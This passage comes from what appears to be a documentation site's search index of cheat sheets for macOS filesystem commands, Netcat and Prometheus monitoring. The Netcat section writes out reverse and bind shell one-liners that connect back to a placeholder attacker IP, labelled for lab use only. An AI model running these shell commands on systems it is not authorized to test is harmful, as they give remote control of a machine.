enable\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#finder-integration","title":"Finder Integration","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#open-in-finder","title":"Open in Finder","text":"<pre><code># Open current directory\nopen .\n\n# Open specific directory\nopen ~/Documents\n\n# Open with application\nopen -a \"Visual Studio Code\" file.txt\nopen -a Safari https://example.com\n\n# Reveal in Finder\nopen -R file.txt\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#quick-look","title":"Quick Look","text":"<pre><code># Preview file\nqlmanage -p file.pdf\n\n# Clear Quick Look cache\nqlmanage -r\nqlmanage -r cache\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#time-machine","title":"Time Machine","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#time-machine-directories","title":"Time Machine Directories","text":"<pre><code># Local snapshots\n/.MobileBackups/\n\n# Backups on external drive\n/Volumes/Time Machine/Backups.backupdb/ComputerName/\n\n# Exclude from backup\ntmutil addexclusion ~/large-directory/\ntmutil removeexclusion ~/large-directory/\n\n# List exclusions\ntmutil isexcluded ~/directory/\n</code></pre>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#organization","title":"Organization","text":"<ul> <li>Store user files in ~/Documents, ~/Downloads, etc.</li> <li>Use ~/Library/Application Support for app data</li> <li>Keep ~/Library clean (many apps don't clean up)</li> <li>Use iCloud Drive for cloud storage</li> </ul>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#security","title":"Security","text":"<ul> <li>Remove quarantine only from trusted apps</li> <li>Be cautious with sudo commands</li> <li>Keep SIP enabled</li> <li>Use FileVault for disk encryption</li> <li>Regular Time Machine backups</li> </ul>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#performance","title":"Performance","text":"<ul> <li>Clear caches periodically</li> <li>Use APFS snapshots before major changes</li> <li>Monitor disk space</li> <li>Disable Spotlight on external drives if not needed</li> </ul>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#maintenance","title":"Maintenance","text":"<ul> <li>Clean ~/Library/Caches regularly</li> <li>Remove old iOS backups from ~/Library/Application Support/MobileSync/</li> <li>Check ~/Downloads for old files</li> <li>Use Storage Management (About This Mac &gt; Storage)</li> </ul>"},{"location":"cheat-sheet/macos-filesystem/macos-filesystem/#resources","title":"Resources","text":"<ul> <li>Apple File System Reference: https://developer.apple.com/documentation/foundation/file_system</li> <li>File System Programming Guide: https://developer.apple.com/library/archive/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/</li> <li>man pages: <code>man xattr</code>, <code>man diskutil</code>, <code>man tmutil</code></li> <li>APFS documentation: https://support.apple.com/guide/disk-utility/</li> </ul>"},{"location":"cheat-sheet/netcat/netcat/","title":"\ufffd Netcat (nc) Cheat Sheet","text":"<p>Filename suggestion: <code>NETCAT_CHEATSHEET.md</code> Netcat \u2014 the \"Swiss army knife\" of networking. Use it to read/write data across network connections using TCP or UDP. Security note: Commands that open shells, forward ports, or transfer data must be used only on systems you own or are authorized to test.</p>"},{"location":"cheat-sheet/netcat/netcat/#basic-syntax","title":"\u2699\ufe0f Basic syntax","text":"<pre><code>nc [options] [host] [port]\n</code></pre>"},{"location":"cheat-sheet/netcat/netcat/#common-options-varies-by-implementation-gnu-netcat-openbsd-netcat-ncat","title":"\ufffd Common options (varies by implementation: GNU netcat, OpenBSD netcat, Ncat)","text":"Option Meaning <code>-l</code> Listen mode (server) <code>-p &lt;port&gt;</code> Local port (used with <code>-l</code>) <code>-u</code> Use UDP (default is TCP) <code>-v</code> / <code>-vv</code> Verbose / very verbose <code>-n</code> Numeric-only (no DNS lookups) <code>-z</code> Zero-I/O mode \u2014 for port scanning (no data sent) <code>-w &lt;sec&gt;</code> Timeout for connects and final net reads <code>-e &lt;program&gt;</code> Execute program after connect (often disabled for security) <code>-k</code> Keep listening after client disconnects (use with <code>-l</code>) <code>-q &lt;sec&gt;</code> Quit after EOF on stdin and specified delay (GNU netcat) <code>-s &lt;addr&gt;</code> Use specific source address <code>-C</code> Send CRLF as line-ending (some variants) <code>-S</code> TCP MD5 signature (rare/specialized) <code>-X</code> / <code>-x</code> Proxy options (in some builds) <p>Note: Flags differ between implementations (OpenBSD <code>nc</code>, GNU <code>netcat</code>, Ncat from Nmap). Check <code>man nc</code> / <code>nc --help</code> for your version.</p>"},{"location":"cheat-sheet/netcat/netcat/#simple-client-connection","title":"\ufffd Simple client connection","text":"<p>Connect to a host/port: <pre><code>nc example.com 80\n</code></pre> Use it to send raw requests (HTTP, SMTP, etc.): <pre><code>GET / HTTP/1.1\nHost: example.com\n</code></pre></p>"},{"location":"cheat-sheet/netcat/netcat/#simple-server-chatdemo","title":"\ufffd\ufe0f Simple server (chat/demo)","text":"<p>Server (listen): <pre><code>nc -l -p 1234\n</code></pre> Client (connect): <pre><code>nc 192.168.1.100 1234\n</code></pre> Type messages between terminals.</p>"},{"location":"cheat-sheet/netcat/netcat/#file-transfer-tcp","title":"\ufffd File transfer (TCP)","text":"<p>Sender (server) \u2014 listen and send file to the first client that connects: <pre><code>nc -l -p 4444 &lt; myfile.tar.gz\n</code></pre> Receiver (client) \u2014 connect and write to disk: <pre><code>nc &lt;server_ip&gt; 4444 &gt; myfile.tar.gz\n</code></pre></p> <p>With progress (pv): <pre><code>pv myfile.tar.gz | nc -l -p 4444\n# client\nnc server_ip 4444 &gt; myfile.tar.gz\n</code></pre></p>"},{"location":"cheat-sheet/netcat/netcat/#udp-examples","title":"\ufffd UDP examples","text":"<p>Listen on UDP port 9999: <pre><code>nc -u -l -p 9999\n</code></pre> Send UDP datagram: <pre><code>echo \"hello\" | nc -u target_ip 9999\n</code></pre></p> <p>Note: UDP is connectionless \u2014 ordering and delivery are not guaranteed.</p>"},{"location":"cheat-sheet/netcat/netcat/#port-scanning-quick","title":"\ufffd Port scanning (quick)","text":"<p>Scan ports 20\u20131024: <pre><code>nc -zv 192.168.1.1 20-1024\n</code></pre> <code>-z</code> = zero I/O (no data); <code>-v</code> = verbose (shows open/closed). For more advanced scanning use <code>nmap</code>.</p>"},{"location":"cheat-sheet/netcat/netcat/#banner-grabbing-service-detection","title":"\ufffd Banner grabbing / service detection","text":"<p>Grab an SMTP banner: <pre><code>nc -nv mail.example.com 25\n</code></pre> Grab HTTP headers: <pre><code>echo -e \"HEAD / HTTP/1.0\\r\\n\\r\\n\" | nc -nv example.com 80\n</code></pre></p>"},{"location":"cheat-sheet/netcat/netcat/#reverse-shell-for-labtesting-only","title":"\ufffd Reverse shell (for lab/testing only)","text":"<p>Attacker (listener): <pre><code>nc -l -p 4444\n</code></pre> Target (connect back): <pre><code>nc &lt;attacker_ip&gt; 4444 -e /bin/bash\n</code></pre></p> <p>Many <code>nc</code> builds (e.g., OpenBSD) disable <code>-e</code>. Alternative using FIFO: <pre><code>mkfifo /tmp/f; nc &lt;attacker_ip&gt; 4444 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1; rm /tmp/f\n</code></pre></p>"},{"location":"cheat-sheet/netcat/netcat/#bind-shell-listen-on-target","title":"\ufffd Bind shell (listen on target)","text":"<p>On target: <pre><code>nc -l -p 4444 -e /bin/bash\n</code></pre> On attacker: <pre><code>nc &lt;target_ip&gt; 4444\n</code></pre></p> <p>Bind shells expose a listening service on the target \u2014 can be blocked by firewalls.</p>"},{"location":"cheat-sheet/netcat/netcat/#port-forwarding-proxying-simple","title":"\ufffd Port forwarding / proxying (simple)","text":"<p>Netcat alone doesn't do robust transparent proxying, but you can chain connections: <pre><code># Forward local port 8080 to remote host:80 via an intermediate host\n# On intermediate host:\nmkfifo backpipe\nnc -l -p 8080 &lt; backpipe | nc target_host 80 &gt; backpipe\n</code></pre> For production-grade port forwarding use <code>ssh -L</code>/<code>ssh -R</code>, <code>socat</code>, or dedicated proxies.</p>"},{"location":"cheat-sheet/netcat/netcat/#misc-useful-commands","title":"\ufffd Misc useful commands","text":"<ul> <li>Repeat last command: use shell history (<code>!!</code>) not nc-specific.  </li> <li>Show local listening ports: <code>ss -tuln</code> or <code>netstat -tuln</code>.  </li> <li>Combine with <code>openssl</code> for TLS: <pre><code># Server: listen and upgrade to TLS (requires openssl and cert/key)\nopenssl s_server -accept 8443 -cert cert.pem -key key.pem -quiet\n# Client:\nopenssl s_client -connect server:8443\n</code></pre></li> </ul>"},{"location":"cheat-sheet/netcat/netcat/#security-best-practices","title":"\u26a0\ufe0f Security &amp; best practices","text":"<ul> <li>Never run reverse/bind shells against systems you don't own or have permission to test.  </li> <li>Prefer secure alternatives (SSH, mutual TLS).  </li> <li>Modern <code>nc</code> variants may restrict dangerous options (<code>-e</code>). Use <code>socat</code> for more advanced, secure setups.  </li> <li>Be aware of firewall/NAT behaviors \u2014 they may block or translate ports.</li> </ul>"},{"location":"cheat-sheet/netcat/netcat/#troubleshooting-tips","title":"\ufffd Troubleshooting tips","text":"<ul> <li>If <code>-e</code> is missing, check your <code>nc</code> version (<code>nc --version</code> or <code>man nc</code>).  </li> <li>Use <code>-vv</code> to increase verbosity for debugging.  </li> <li>For firewall issues, verify with <code>iptables -L</code> / Windows Firewall rules.  </li> <li>For file transfer issues, confirm no intermediate device is altering stream (anti-virus, proxies).</li> </ul>"},{"location":"cheat-sheet/netcat/netcat/#references-further-reading","title":"\ufffd References / further reading","text":"<ul> <li><code>man nc</code> (your system)  </li> <li>Ncat (from Nmap): https://nmap.org/ncat/  </li> <li><code>socat</code> documentation for advanced piping and forwarding.</li> </ul>"},{"location":"cheat-sheet/netcat/netcat/#quick-examples-cheat-list","title":"\u2705 Quick examples cheat list","text":"<pre><code># Simple connect\nnc example.com 80\n\n# Simple listen\nnc -l -p 1234\n\n# File send (server)\nnc -l -p 4444 &lt; myfile.gz\n\n# File receive (client)\nnc server_ip 4444 &gt; myfile.gz\n\n# UDP listen\nnc -u -l -p 9999\n\n# Port scan\nnc -zv 192.168.1.1 20-1024\n\n# Banner grab\necho -e \"HEAD / HTTP/1.0\\r\\n\\r\\n\" | nc -nv example.com 80\n\n# Reverse shell (if supported)\nnc attacker_ip 4444 -e /bin/bash\n</code></pre> <p>End of cheat sheet.</p>"},{"location":"cheat-sheet/prometheus/prometheus/","title":"Prometheus Cheat Sheet","text":""},{"location":"cheat-sheet/prometheus/prometheus/#overview","title":"Overview","text":"<p>Prometheus is an open-source monitoring and alerting toolkit designed for reliability and quick problem diagnosis.</p> <p>Key Features: - Multi-dimensional data model with time series - Flexible PromQL query language - Pull-based metrics collection - Service discovery support - No dependency on distributed storage - Multiple modes of graphing and dashboarding</p>"},{"location":"cheat-sheet/prometheus/prometheus/#installation","title":"Installation","text":""},{"location":"cheat-sheet/prometheus/prometheus/#docker","title":"Docker","text":"<pre><code>docker run -p 9090:9090 prom/prometheus\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#docker-with-custom-config","title":"Docker with custom config","text":"<pre><code>docker run -p 9090:9090 \\\n  -v /path/to/prometheus.yml:/etc/prometheus/prometheus.yml \\\n  prom/prometheus\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#binary","title":"Binary","text":"<pre><code># Download from https://prometheus.io/download/\ntar xvfz prometheus-*.tar.gz\ncd prometheus-*\n./prometheus --config.file=prometheus.yml\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#kubernetes-with-helm","title":"Kubernetes (with Helm)","text":"<pre><code>helm repo add prometheus-community https://prometheus-community.github.io/helm-charts\nhelm install prometheus prometheus-community/prometheus\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#configuration","title":"Configuration","text":""},{"location":"cheat-sheet/prometheus/prometheus/#basic-prometheusyml","title":"Basic prometheus.yml","text":"<pre><code>global:\n  scrape_interval: 15s           # How often to scrape targets\n  evaluation_interval: 15s       # How often to evaluate rules\n  external_labels:\n    cluster: 'production'        # Labels to attach to any time series\n\n# Alertmanager configuration\nalerting:\n  alertmanagers:\n    - static_configs:\n        - targets: ['localhost:9093']\n\n# Rule files\nrule_files:\n  - \"alert_rules.yml\"\n  - \"recording_rules.yml\"\n\n# Scrape configurations\nscrape_configs:\n  - job_name: 'prometheus'\n    static_configs:\n      - targets: ['localhost:9090']\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#scrape-configuration-examples","title":"Scrape Configuration Examples","text":""},{"location":"cheat-sheet/prometheus/prometheus/#static-targets","title":"Static targets","text":"<pre><code>scrape_configs:\n  - job_name: 'node'\n    static_configs:\n      - targets:\n          - 'localhost:9100'\n          - 'server1:9100'\n          - 'server2:9100'\n        labels:\n          environment: 'production'\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#custom-metrics-path","title":"Custom metrics path","text":"<pre><code>scrape_configs:\n  - job_name: 'app'\n    metrics_path: '/custom/metrics'\n    static_configs:\n      - targets: ['app-server:8080']\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#with-authentication","title":"With authentication","text":"<pre><code>scrape_configs:\n  - job_name: 'secure-app'\n    basic_auth:\n      username: 'admin'\n      password: 'secret'\n    static_configs:\n      - targets: ['secure-app:8080']\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#kubernetes-service-discovery","title":"Kubernetes service discovery","text":"<pre><code>scrape_configs:\n  - job_name: 'kubernetes-pods'\n    kubernetes_sd_configs:\n      - role: pod\n    relabel_configs:\n      - source_labels: [__meta_kubernetes_pod_label_app]\n        action: keep\n        regex: myapp\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#file-based-service-discovery","title":"File-based service discovery","text":"<pre><code>scrape_configs:\n  - job_name: 'dynamic-services'\n    file_sd_configs:\n      - files:\n          - '/etc/prometheus/targets/*.json'\n        refresh_interval: 30s\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#metric-types","title":"Metric Types","text":""},{"location":"cheat-sheet/prometheus/prometheus/#counter","title":"Counter","text":"<p>A cumulative metric that only increases.</p> <pre><code># Example: Total HTTP requests\nhttp_requests_total{method=\"GET\", endpoint=\"/api/users\"} 1234\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#gauge","title":"Gauge","text":"<p>A metric that can go up and down.</p> <pre><code># Example: Current memory usage\nmemory_usage_bytes{instance=\"server1\"} 524288000\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#histogram","title":"Histogram","text":"<p>Samples observations and counts them in configurable buckets.</p> <pre><code># Example: Request duration\nhttp_request_duration_seconds_bucket{le=\"0.1\"} 100\nhttp_request_duration_seconds_bucket{le=\"0.5\"} 250\nhttp_request_duration_seconds_bucket{le=\"1.0\"} 300\nhttp_request_duration_seconds_sum 280.5\nhttp_request_duration_seconds_count 300\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#summary","title":"Summary","text":"<p>Similar to histogram but calculates quantiles on the client side.</p> <pre><code># Example: Request duration summary\nhttp_request_duration_seconds{quantile=\"0.5\"} 0.23\nhttp_request_duration_seconds{quantile=\"0.9\"} 0.87\nhttp_request_duration_seconds{quantile=\"0.99\"} 1.2\nhttp_request_duration_seconds_sum 280.5\nhttp_request_duration_seconds_count 300\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#promql-query-language","title":"PromQL - Query Language","text":""},{"location":"cheat-sheet/prometheus/prometheus/#basic-selectors","title":"Basic Selectors","text":""},{"location":"cheat-sheet/prometheus/prometheus/#select-all-time-series-for-a-metric","title":"Select all time series for a metric","text":"<pre><code>http_requests_total\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#filter-by-label","title":"Filter by label","text":"<pre><code>http_requests_total{job=\"prometheus\"}\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#multiple-label-filters","title":"Multiple label filters","text":"<pre><code>http_requests_total{job=\"api\", method=\"GET\", status=\"200\"}\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#label-matching-operators","title":"Label matching operators","text":"<pre><code># Equality\nhttp_requests_total{job=\"api\"}\n\n# Inequality\nhttp_requests_total{job!=\"api\"}\n\n# Regex match\nhttp_requests_total{job=~\"api.*\"}\n\n# Regex non-match\nhttp_requests_total{job!~\"test.*\"}\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#range-vectors","title":"Range Vectors","text":"<pre><code># Last 5 minutes\nhttp_requests_total[5m]\n\n# Last 1 hour\nhttp_requests_total[1h]\n\n# Time units: s (seconds), m (minutes), h (hours), d (days), w (weeks), y (years)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#offset-modifier","title":"Offset Modifier","text":"<pre><code># Current value\nhttp_requests_total\n\n# Value from 5 minutes ago\nhttp_requests_total offset 5m\n\n# Range from 1 hour ago\nhttp_requests_total[5m] offset 1h\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#operators","title":"Operators","text":""},{"location":"cheat-sheet/prometheus/prometheus/#arithmetic-operators","title":"Arithmetic operators","text":"<pre><code># Addition\nnode_memory_total_bytes + node_memory_cached_bytes\n\n# Subtraction\nnode_memory_total_bytes - node_memory_used_bytes\n\n# Multiplication\nrate(http_requests_total[5m]) * 60\n\n# Division\nnode_memory_used_bytes / node_memory_total_bytes * 100\n\n# Modulo\nnode_cpu_seconds_total % 100\n\n# Power\nnode_memory_bytes ^ 2\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#comparison-operators","title":"Comparison operators","text":"<pre><code># Equal\nhttp_requests_total == 100\n\n# Not equal\nhttp_requests_total != 100\n\n# Greater than\nhttp_requests_total &gt; 100\n\n# Less than\nhttp_requests_total &lt; 100\n\n# Greater or equal\nhttp_requests_total &gt;= 100\n\n# Less or equal\nhttp_requests_total &lt;= 100\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#logical-operators","title":"Logical operators","text":"<pre><code># AND\n(http_requests_total &gt; 100) and (http_errors_total &gt; 10)\n\n# OR\n(http_requests_total &gt; 100) or (http_errors_total &gt; 10)\n\n# UNLESS (exclude)\nhttp_requests_total unless http_errors_total\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#aggregation-operators","title":"Aggregation Operators","text":""},{"location":"cheat-sheet/prometheus/prometheus/#sum","title":"sum","text":"<pre><code># Total requests across all instances\nsum(http_requests_total)\n\n# Sum by job\nsum(http_requests_total) by (job)\n\n# Sum without specific labels\nsum(http_requests_total) without (instance)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#avg","title":"avg","text":"<pre><code># Average CPU usage\navg(cpu_usage_percent)\n\n# Average by environment\navg(cpu_usage_percent) by (environment)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#min-max","title":"min / max","text":"<pre><code># Minimum memory across instances\nmin(node_memory_available_bytes)\n\n# Maximum response time\nmax(http_request_duration_seconds)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#count","title":"count","text":"<pre><code># Number of instances\ncount(up)\n\n# Number of instances by job\ncount(up) by (job)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#stddev-stdvar","title":"stddev / stdvar","text":"<pre><code># Standard deviation of response time\nstddev(http_request_duration_seconds)\n\n# Standard variance\nstdvar(http_request_duration_seconds)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#topk-bottomk","title":"topk / bottomk","text":"<pre><code># Top 5 instances by CPU usage\ntopk(5, cpu_usage_percent)\n\n# Bottom 3 instances by memory\nbottomk(3, node_memory_available_bytes)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#quantile","title":"quantile","text":"<pre><code># 95th percentile response time\nquantile(0.95, http_request_duration_seconds)\n\n# 50th percentile (median) by service\nquantile(0.5, http_request_duration_seconds) by (service)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#functions","title":"Functions","text":""},{"location":"cheat-sheet/prometheus/prometheus/#rate","title":"rate()","text":"<p>Calculate per-second rate (for counters).</p> <pre><code># Requests per second over last 5 minutes\nrate(http_requests_total[5m])\n\n# Network bytes received per second\nrate(node_network_receive_bytes_total[1m])\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#irate","title":"irate()","text":"<p>Calculate instant rate (using last two points).</p> <pre><code># Instant requests per second\nirate(http_requests_total[5m])\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#increase","title":"increase()","text":"<p>Calculate increase over time range.</p> <pre><code># Total increase in requests over 1 hour\nincrease(http_requests_total[1h])\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#delta","title":"delta()","text":"<p>Calculate difference between first and last value.</p> <pre><code># Change in CPU temperature\ndelta(cpu_temperature_celsius[10m])\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#deriv","title":"deriv()","text":"<p>Calculate per-second derivative.</p> <pre><code># Rate of change in memory usage\nderiv(node_memory_used_bytes[5m])\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#predict_linear","title":"predict_linear()","text":"<p>Predict future value using linear regression.</p> <pre><code># Predict disk usage in 4 hours\npredict_linear(node_filesystem_free_bytes[1h], 4*3600)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#histogram_quantile","title":"histogram_quantile()","text":"<p>Calculate quantile from histogram.</p> <pre><code># 95th percentile request duration\nhistogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m]))\n\n# 50th percentile by service\nhistogram_quantile(0.5, sum(rate(http_request_duration_seconds_bucket[5m])) by (le, service))\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#abs","title":"abs()","text":"<p>Absolute value.</p> <pre><code>abs(delta(metric[5m]))\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#ceil-floor-round","title":"ceil() / floor() / round()","text":"<p>Rounding functions.</p> <pre><code># Round up\nceil(node_memory_used_bytes / 1024 / 1024)\n\n# Round down\nfloor(cpu_usage_percent)\n\n# Round to nearest\nround(response_time_seconds, 0.1)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#clamp_max-clamp_min","title":"clamp_max() / clamp_min()","text":"<p>Limit values to a range.</p> <pre><code># Cap at maximum of 100\nclamp_max(cpu_usage_percent, 100)\n\n# Ensure minimum of 0\nclamp_min(available_connections, 0)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#sort-sort_desc","title":"sort() / sort_desc()","text":"<p>Sort results.</p> <pre><code># Sort ascending\nsort(http_requests_total)\n\n# Sort descending\nsort_desc(http_requests_total)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#time","title":"time()","text":"<p>Current Unix timestamp.</p> <pre><code># Seconds since metric was last updated\ntime() - timestamp(metric)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#label_replace","title":"label_replace()","text":"<p>Add or modify labels.</p> <pre><code># Add new label based on existing label\nlabel_replace(up, \"env\", \"$1\", \"instance\", \"(.*):(.*)\")\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#label_join","title":"label_join()","text":"<p>Join multiple labels into one.</p> <pre><code># Combine labels\nlabel_join(up, \"full_instance\", \"-\", \"instance\", \"job\")\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#common-query-examples","title":"Common Query Examples","text":""},{"location":"cheat-sheet/prometheus/prometheus/#httpapi-metrics","title":"HTTP/API Metrics","text":"<pre><code># Request rate by status code\nsum(rate(http_requests_total[5m])) by (status_code)\n\n# Error rate (4xx and 5xx)\nsum(rate(http_requests_total{status_code=~\"4..|5..\"}[5m]))\n\n# Error percentage\nsum(rate(http_requests_total{status_code=~\"4..|5..\"}[5m]))\n/\nsum(rate(http_requests_total[5m])) * 100\n\n# 95th percentile latency\nhistogram_quantile(0.95, sum(rate(http_request_duration_seconds_bucket[5m])) by (le))\n\n# Requests per minute\nsum(rate(http_requests_total[1m])) * 60\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#system-metrics","title":"System Metrics","text":"<pre><code># CPU usage percentage\n100 - (avg(rate(node_cpu_seconds_total{mode=\"idle\"}[5m])) * 100)\n\n# Memory usage percentage\n(1 - (node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes)) * 100\n\n# Disk usage percentage\n(1 - (node_filesystem_avail_bytes / node_filesystem_size_bytes)) * 100\n\n# Network traffic (bytes/sec)\nrate(node_network_receive_bytes_total[5m])\nrate(node_network_transmit_bytes_total[5m])\n\n# Load average\nnode_load1\nnode_load5\nnode_load15\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#database-metrics","title":"Database Metrics","text":"<pre><code># MySQL queries per second\nrate(mysql_global_status_queries[5m])\n\n# PostgreSQL active connections\npg_stat_activity_count\n\n# Redis memory usage\nredis_memory_used_bytes / redis_memory_max_bytes * 100\n\n# Slow queries\nrate(mysql_global_status_slow_queries[5m])\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#container-metrics","title":"Container Metrics","text":"<pre><code># Container CPU usage\nrate(container_cpu_usage_seconds_total[5m])\n\n# Container memory usage\ncontainer_memory_usage_bytes\n\n# Container network traffic\nrate(container_network_receive_bytes_total[5m])\nrate(container_network_transmit_bytes_total[5m])\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#availability-uptime","title":"Availability &amp; Uptime","text":"<pre><code># Instance up/down\nup\n\n# Instances down\ncount(up == 0)\n\n# Uptime percentage (last 24h)\navg_over_time(up[24h]) * 100\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#alerting-rules","title":"Alerting Rules","text":""},{"location":"cheat-sheet/prometheus/prometheus/#alert-rule-file-alert_rulesyml","title":"Alert Rule File (alert_rules.yml)","text":"<pre><code>groups:\n  - name: example\n    interval: 30s\n    rules:\n      - alert: HighErrorRate\n        expr: |\n          sum(rate(http_requests_total{status_code=~\"5..\"}[5m]))\n          /\n          sum(rate(http_requests_total[5m])) &gt; 0.05\n        for: 10m\n        labels:\n          severity: critical\n          team: backend\n        annotations:\n          summary: \"High error rate detected\"\n          description: \"Error rate is {{ $value | humanizePercentage }} on {{ $labels.instance }}\"\n\n      - alert: InstanceDown\n        expr: up == 0\n        for: 5m\n        labels:\n          severity: critical\n        annotations:\n          summary: \"Instance {{ $labels.instance }} down\"\n          description: \"{{ $labels.instance }} of job {{ $labels.job }} has been down for more than 5 minutes.\"\n\n      - alert: HighMemoryUsage\n        expr: |\n          (1 - (node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes)) * 100 &gt; 90\n        for: 5m\n        labels:\n          severity: warning\n        annotations:\n          summary: \"High memory usage on {{ $labels.instance }}\"\n          description: \"Memory usage is {{ $value | humanize }}% on {{ $labels.instance }}\"\n\n      - alert: DiskSpaceLow\n        expr: |\n          (1 - (node_filesystem_avail_bytes / node_filesystem_size_bytes)) * 100 &gt; 85\n        for: 10m\n        labels:\n          severity: warning\n        annotations:\n          summary: \"Disk space low on {{ $labels.instance }}\"\n          description: \"Disk {{ $labels.mountpoint }} is {{ $value | humanize }}% full\"\n\n      - alert: HighCPUUsage\n        expr: |\n          100 - (avg(rate(node_cpu_seconds_total{mode=\"idle\"}[5m])) * 100) &gt; 80\n        for: 10m\n        labels:\n          severity: warning\n        annotations:\n          summary: \"High CPU usage on {{ $labels.instance }}\"\n          description: \"CPU usage is {{ $value | humanize }}%\"\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#recording-rules","title":"Recording Rules","text":""},{"location":"cheat-sheet/prometheus/prometheus/#recording-rule-file-recording_rulesyml","title":"Recording Rule File (recording_rules.yml)","text":"<pre><code>groups:\n  - name: performance\n    interval: 30s\n    rules:\n      # Pre-calculate request rate\n      - record: job:http_requests:rate5m\n        expr: sum(rate(http_requests_total[5m])) by (job)\n\n      # Pre-calculate error rate\n      - record: job:http_errors:rate5m\n        expr: sum(rate(http_requests_total{status_code=~\"5..\"}[5m])) by (job)\n\n      # Pre-calculate error percentage\n      - record: job:http_error_percentage:rate5m\n        expr: |\n          job:http_errors:rate5m\n          /\n          job:http_requests:rate5m * 100\n\n      # Pre-calculate CPU usage\n      - record: instance:node_cpu:usage\n        expr: 100 - (avg(rate(node_cpu_seconds_total{mode=\"idle\"}[5m])) by (instance) * 100)\n\n      # Pre-calculate memory usage percentage\n      - record: instance:node_memory:usage_percent\n        expr: |\n          (1 - (node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes)) * 100\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#common-exporters","title":"Common Exporters","text":""},{"location":"cheat-sheet/prometheus/prometheus/#node-exporter","title":"Node Exporter","text":"<p>Exports hardware and OS metrics.</p> <pre><code># Docker\ndocker run -d -p 9100:9100 \\\n  --name node-exporter \\\n  -v \"/proc:/host/proc:ro\" \\\n  -v \"/sys:/host/sys:ro\" \\\n  -v \"/:/rootfs:ro\" \\\n  prom/node-exporter \\\n  --path.procfs=/host/proc \\\n  --path.sysfs=/host/sys\n</code></pre> <p>Common metrics: - <code>node_cpu_seconds_total</code> - <code>node_memory_MemTotal_bytes</code> - <code>node_memory_MemAvailable_bytes</code> - <code>node_filesystem_size_bytes</code> - <code>node_network_receive_bytes_total</code></p>"},{"location":"cheat-sheet/prometheus/prometheus/#blackbox-exporter","title":"Blackbox Exporter","text":"<p>Probes endpoints (HTTP, TCP, DNS, ICMP).</p> <pre><code># prometheus.yml\nscrape_configs:\n  - job_name: 'blackbox'\n    metrics_path: /probe\n    params:\n      module: [http_2xx]\n    static_configs:\n      - targets:\n          - https://example.com\n          - https://api.example.com\n    relabel_configs:\n      - source_labels: [__address__]\n        target_label: __param_target\n      - source_labels: [__param_target]\n        target_label: instance\n      - target_label: __address__\n        replacement: 